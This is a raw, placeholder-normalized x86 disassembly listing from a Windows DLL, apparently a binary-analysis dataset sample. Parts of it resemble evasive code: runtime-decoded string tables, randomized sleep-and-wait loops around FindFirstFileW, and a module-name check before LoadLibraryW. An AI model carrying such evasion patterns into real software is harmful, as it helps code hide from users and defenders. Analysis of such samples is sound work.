mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1001df01
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
test edi edi
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_10026eb0
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_10026eb0
add esp 0x14
test eax eax
jle r-xdata
add [ ebp - 0x8 ] eax
inc edi
sub ebx eax
jne r-xdata
add [ ebp + 0x8 ] eax
add ebx 0x2
dec edi
jne r-xdata
sub_1000b470
push ebp
mov ebp esp
push 0xffffffff
push sub_10088f36
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2e0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
lea ecx [ ebp - 0x2dc ]
push ecx
lea edx [ ebp - 0x2d8 ]
push edx
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2dc ] ebx
call sub_10037500
mov edi eax
add esp 0x8
cmp edi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edi [ ebp - 0x2dc ]
lea ecx [ ebp - 0x2d8 ]
call sub_10060060
mov edi eax
cmp edi ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x16
call sub_10045930
lea eax [ ebp - 0x14c ]
push edi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0xcc ]
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] ebx
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xe
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x11c ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov ecx [ ebp - 0x2dc ]
mov edx [ ebp - 0x2d8 ]
push eax
call sub_10070640
test eax eax
jne r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x138
call sub_10045930
lea ecx [ ebp - 0x14c ]
push edi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xc4 ]
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x2
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xe
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x11c ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0x11c ] 0x7
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x130 ] dx
cmp [ ebp - 0x138 ] esi
jb r-xdata
mov ecx [ ebp - 0x130 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x2d8 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x7b
call sub_10045930
lea edx [ ebp - 0x78 ]
mov eax 0x27
call sub_10045930
lea edx [ ebp - 0x40 ]
mov eax 0x74
call sub_10045930
lea edx [ ebp - 0x28 ]
mov eax 0x12c
call sub_10045930
mov eax [ esi ]
lea edx [ ebp - 0x2e4 ]
push edx
lea ecx [ ebp - 0x2ec ]
push ecx
lea edx [ ebp - 0x2e8 ]
push edx
lea ecx [ ebp - 0x2e0 ]
push ecx
mov [ ebp - 0x2e0 ] ebx
mov [ ebp - 0x2e8 ] ebx
mov [ ebp - 0x2e4 ] ebx
mov [ ebp - 0x2ec ] ebx
call sub_10051a10
lea edx [ ebp - 0x114 ]
mov eax 0xc0
call sub_10045930
mov edx [ ebp - 0x2e4 ]
push edx
lea eax [ ebp - 0x264 ]
push eax
call sub_1005f2b0
mov ebx eax
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x2ec ]
push ecx
lea edx [ ebp - 0x1f4 ]
push edx
call sub_1005f2b0
add esp 0x10
mov edi eax
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10054d00
push eax
lea edx [ ebp - 0x114 ]
lea esi [ ebp - 0x2b8 ]
mov [ ebp - 0x4 ] 0x6
call sub_1005bbc0
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov edx [ ebp - 0x2e0 ]
push eax
lea esi [ ebp - 0x280 ]
call sub_1001ccb0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0x8
call sub_1001ccb0
add esp 0x4
push eax
lea edx [ ebp - 0x78 ]
lea esi [ ebp - 0x210 ]
mov [ ebp - 0x4 ] 0x9
call sub_1001ccb0
add esp 0x4
mov [ ebp - 0x4 ] 0xa
push eax
mov edx [ ebp - 0x2e8 ]
lea esi [ ebp - 0x184 ]
call sub_1001ccb0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] 0xb
call sub_1001ccb0
add esp 0x4
push eax
lea edx [ ebp - 0x28 ]
lea esi [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0xc
call sub_1001ccb0
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0x29c ]
mov [ ebp - 0x4 ] 0xd
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0xe
call sub_1001ccb0
add esp 0x4
push eax
lea edx [ ebp - 0x40 ]
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0xf
call sub_1001ccb0
add esp 0x4
mov ecx eax
mov eax ebx
lea edi [ ebp - 0x1d8 ]
mov [ ebp - 0x4 ] 0x10
call sub_10057920
mov edx eax
mov ecx 0xe
mov [ ebp - 0x4 ] 0x11
call sub_100205a0
mov ecx edi
call sub_10019100
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x22c ]
call sub_10019100
lea ecx [ ebp - 0x29c ]
call sub_10019100
lea ecx [ ebp - 0x1a0 ]
call sub_10019100
lea ecx [ ebp - 0x1bc ]
call sub_10019100
lea ecx [ ebp - 0x184 ]
call sub_10019100
lea ecx [ ebp - 0x210 ]
call sub_10019100
lea ecx [ ebp - 0x248 ]
call sub_10019100
lea ecx [ ebp - 0x280 ]
call sub_10019100
lea ecx [ ebp - 0x2b8 ]
call sub_10019100
lea ecx [ ebp - 0x2d4 ]
call sub_10019100
lea ecx [ ebp - 0x1f4 ]
call sub_10019100
lea ecx [ ebp - 0x264 ]
call sub_10019100
mov eax 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x11c ] 0x7
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x130 ] ax
cmp [ ebp - 0x138 ] esi
jb r-xdata
mov edx [ ebp - 0x130 ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x14c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x14c ]
push ecx
call sub_100187af
add esp 0x4
sub_1000b900
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + 0x34 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ esp + 0x2f ] 0x0
fxch st1
fxch st1
mov [ esp + 0x2f ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x2 ] cl
fstp [ esp ]
mov ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x4c ]
push edx
mov [ eax + 0x3 ] 0x0
lea eax [ esp + 0x58 ]
push 0x6c
push eax
call sub_1005c1c5
mov ecx [ esp + 0x48 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ esp + 0x58 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ esp + 0x70 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ esp + 0x6c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_1004fe90
mov ecx [ esp + 0x100 ]
add esp 0x44
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_1000bb10
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1000bb8f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_1005af1f
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_1003f57a
pop ecx
push eax
mov esi r--data
push esi
call sub_1007f360
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_10082460
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_1003f57a
pop ecx
push eax
push esi
call sub_1007f360
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_1006299d
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_100845f0
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_1000bda0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi + 0x34 ] 0x10
lea eax [ edi + 0x20 ]
jb r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
push ecx
push eax
lea edx [ esi + 0x122 ]
call sub_100247f0
mov edx [ esi + 0x14 ]
add esp 0x8
mov [ edi + 0x380 ] edx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ eax ]
sub_1000be00
push ebp
mov ebp esp
push ecx
mov edx [ eax + 0x10 ]
push ebx
mov ebx [ eax + 0x14 ]
push edi
mov edi [ ecx + 0x10 ]
sub ebx edx
mov [ ebp - 0x4 ] 0x0
cmp edi ebx
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_1005e580
mov ebx [ ecx + 0x14 ]
sub ebx edi
cmp ebx edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_10012630
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_10021bf0
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000be60
push ebp
mov ebp esp
push ebx
push edi
mov ebx ecx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_10035937
add esp 0x4
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x8 ] eax
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x10 ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] 0x0
sub_1000bf50
push ebp
mov ebp esp
sub esp 0x264
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
call sub_10065830
cmp eax ebx
je r-xdata
call sub_1004e470
test eax eax
je r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov ecx eax
call sub_10018c90
test eax eax
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
or [ rw-data ] esi
push sub_1008ad30
call sub_100592b3
add esp 0x4
mov [ rw-data ] esi
lea eax [ ebp - 0x25c ]
push eax
lea ecx [ ebp - 0x260 ]
call sub_1002bee0
test eax eax
je r-xdata
call sub_100560e0
cmp eax ebx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edi esi
mov ecx eax
call sub_1005ef30
test eax eax
jne r-xdata
mov esi rw-data
call sub_10023830
cmp [ rw-data ] ebx
je r-xdata
lea ecx [ ebp - 0x258 ]
push ecx
push rw-data
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edi [ GetTickCount@IAT ]
call edi
xor ebx ebx
mov esi 0x1
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x25c ] ebx
mov [ ebp - 0x260 ] ebx
cmp [ rw-data ] esi
jne r-xdata
mov esi [ rw-data ]
mov [ rw-data ] eax
test esi esi
je r-xdata
mov [ rw-data ] esi
lea eax [ ebp - 0x25c ]
push eax
mov [ ebp - 0x25c ] ebx
call sub_10065cb8
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov eax [ ebp - 0x25c ]
xor edx edx
sub esi ecx
div esi
add esp 0x4
add edx ecx
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
jmp r-xdata
call edi
mov edx eax
sub edx [ ebp - 0x264 ]
mov eax [ rw-data ]
add eax edx
mov [ rw-data ] eax
cmp eax 0x927c0
jb r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x22c ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov esi rw-data
call sub_10023830
test ebx ebx
je r-xdata
mov ecx esi
call sub_1001ebf0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
test [ rw-data ] 0x1
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x22c ]
push edx
mov ecx rw-data
call sub_1005ddc0
lea eax [ ebp - 0x260 ]
push eax
lea ecx [ ebp - 0x25c ]
push ecx
lea eax [ ebp - 0x22c ]
call sub_10037500
add esp 0x8
neg eax
sbb eax eax
inc eax
cmp eax ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
call sub_100560e0
cmp eax ebx
je r-xdata
or [ rw-data ] 0x1
push sub_1008ad30
call sub_100592b3
add esp 0x4
mov edi 0x2
jmp r-xdata
lea ecx [ ebp - 0x25c ]
push ecx
mov [ ebp - 0x25c ] 0x0
call sub_10065cb8
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov eax [ ebp - 0x25c ]
xor edx edx
sub esi ecx
div esi
add esp 0x4
add edx ecx
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
cmp edi 0x2
jne r-xdata
lea eax [ ebp - 0x25c ]
call sub_100282e0
jmp r-xdata
mov ecx eax
call sub_1005ef30
test eax eax
jne r-xdata
mov ebx [ ebp - 0x25c ]
mov edx [ ebp - 0x260 ]
push ebx
call sub_10058ae0
test eax eax
jne r-xdata
lea eax [ ebp - 0x25c ]
mov esi rw-data
call sub_1004b960
mov [ rw-data ] 0x1
sub_1000c240
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
mov edi edi
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1000c260
push ebp
mov ebp esp
push 0xffffffff
push sub_10086ce9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_1005e580
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_1005e580
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10028950
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_1000c320
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
jne r-xdata
sub_1000c356
mov edi edi
push esi
push edi
mov esi ecx
call sub_100109d4
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0xc ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0xc ]
push edi
call sub_1004ed30
push edi
call sub_10035d06
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_1000c3a0
push ebp
mov ebp esp
sub esp 0xf54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
mov edx [ rw-data ]
push edx
call [ SetUnhandledExceptionFilter@IAT ]
mov eax [ rw-data ]
push eax
call [ SetErrorMode@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_10034c90
add esp 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0xc
push sub_10072860
call [ SetUnhandledExceptionFilter@IAT ]
push 0x8003
mov [ rw-data ] eax
call [ SetErrorMode@IAT ]
mov [ rw-data ] eax
push 0x104
lea eax [ ebp - 0xf54 ]
push eax
push esi
mov [ rw-data ] esi
call [ GetModuleFileNameW@IAT ]
lea ecx [ ebp - 0xf54 ]
push ecx
call [ PathStripPathW@IAT ]
lea edx [ ebp - 0x7c0 ]
mov eax 0xf4
call sub_10045930
push edx
lea eax [ ebp - 0xf54 ]
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0x7c0 ]
push ecx
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push edi
push 0x6720
mov [ rw-data ] esi
call sub_1001df01
mov esi eax
add esp 0x4
lea edi [ ebp - 0x780 ]
mov eax 0x77
mov [ rw-data ] esi
call sub_1005b580
lea edi [ ebp - 0xbe8 ]
mov eax 0xf9
call sub_1005b580
lea edi [ ebp - 0x2c ]
mov eax 0xf6
call sub_1005b580
lea edi [ ebp - 0x6a8 ]
mov eax 0x47
call sub_1005b580
lea edi [ ebp - 0x280 ]
mov eax 0x93
call sub_1005b580
lea edi [ ebp - 0x3a0 ]
mov eax 0xca
call sub_1005b580
lea edi [ ebp - 0xd0 ]
mov eax 0x30
call sub_1005b580
lea edi [ ebp - 0x440 ]
mov eax 0xd2
call sub_1005b580
lea edi [ ebp - 0xc9c ]
mov eax 0x1e
call sub_1005b580
lea edi [ ebp - 0x480 ]
mov eax 0x81
call sub_1005b580
lea edi [ ebp - 0x5c0 ]
mov eax 0x95
call sub_1005b580
lea edi [ ebp - 0xaf0 ]
mov eax 0x34
call sub_1005b580
lea edi [ ebp - 0xb8 ]
mov eax 0x155
call sub_1005b580
lea edi [ ebp - 0x14c ]
mov eax 0xb6
call sub_1005b580
lea edi [ ebp - 0x4c0 ]
mov eax 0x13d
call sub_1005b580
lea edi [ ebp - 0x7e4 ]
mov eax 0x48
call sub_1005b580
lea edi [ ebp - 0x75c ]
mov eax 0x78
call sub_1005b580
lea edi [ ebp - 0x3c0 ]
mov eax 0xfb
call sub_1005b580
lea edi [ ebp - 0xc14 ]
mov eax 0xa3
call sub_1005b580
lea edi [ ebp - 0x684 ]
mov eax 0xc5
call sub_1005b580
lea edi [ ebp - 0x460 ]
mov eax 0xf5
call sub_1005b580
lea edi [ ebp - 0x70 ]
mov eax 0x22
call sub_1005b580
lea edi [ ebp - 0x400 ]
mov eax 0x4
call sub_1005b580
lea edi [ ebp - 0x874 ]
mov eax 0x33
call sub_1005b580
lea edi [ ebp - 0x328 ]
mov eax 0x12
call sub_1005b580
lea edi [ ebp - 0x40 ]
mov eax 0x94
call sub_1005b580
lea edi [ ebp - 0xd0c ]
mov eax 0x20
call sub_1005b580
lea edi [ ebp - 0x9d8 ]
mov eax 0x140
call sub_1005b580
lea edi [ ebp - 0x1a0 ]
mov eax 0x72
call sub_1005b580
lea edi [ ebp - 0x6cc ]
mov eax 0x1a
call sub_1005b580
lea edi [ ebp - 0x4a0 ]
mov eax 0x97
call sub_1005b580
